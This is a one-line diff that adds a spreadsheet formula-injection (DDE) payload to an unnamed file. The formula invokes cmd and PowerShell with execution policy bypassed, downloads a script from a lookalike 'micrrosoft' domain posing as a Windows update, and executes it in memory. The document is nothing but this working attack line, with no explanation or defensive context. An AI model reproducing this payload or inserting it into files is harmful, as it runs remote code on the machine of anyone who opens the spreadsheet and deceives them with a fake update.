@@ -1,0 +1,1 @@
+=cmd|' /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -exec bypass -c IEX ((New-Object Net.WebClient).DownloadString(\"http://micrrosoft.net/winupdate.ps1\"))'!A0
